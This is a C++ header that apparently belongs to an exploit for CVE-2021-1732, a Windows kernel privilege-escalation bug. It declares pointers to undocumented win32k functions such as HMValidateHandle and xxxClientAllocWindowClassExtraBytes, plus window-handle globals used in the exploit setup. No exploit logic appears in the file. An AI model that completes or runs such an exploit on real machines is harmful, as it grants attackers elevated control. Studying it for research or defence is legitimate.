#pragma once
#include <windows.h>
#include <iostream>
#include <winternl.h>
#include <WinBase.h>
#include <ntstatus.h>
#include "include/common/memtools.hpp"
#include "include/common/gadget.hpp"

namespace CVE_2021_1732
{

    typedef NTSTATUS(WINAPI* FNtUserConsoleControl)(DWORD, ULONG_PTR, ULONG);
    typedef NTSTATUS(WINAPI* FxxxClientAllocWindowClassExtraBytes)(unsigned int* pSize);
    typedef PVOID(WINAPI* FHMValidateHandle)(HANDLE h, BYTE byType);
    typedef DWORD64(NTAPI* FNtCallbackReturn)(DWORD64* a1, DWORD64 a2, DWORD64 a3);

    inline FNtUserConsoleControl NtUserConsoleControl = nullptr;
    inline FxxxClientAllocWindowClassExtraBytes orign_xxxClientAllocWindowClassExtraBytes = nullptr;
    inline FNtCallbackReturn NtCallbackReturn = nullptr;
    inline FHMValidateHandle HMValidateHandle = nullptr;

    inline std::vector<HWND> g_HWNDs;
    inline std::vector<PVOID> g_HWNDKs;
    const size_t magicExtra = 0xDEAD;

    bool initAPI();
    bool FindHMValidateHandle(FHMValidateHandle* pfOutHMValidateHandle);

} // namespace CVE_2021_1732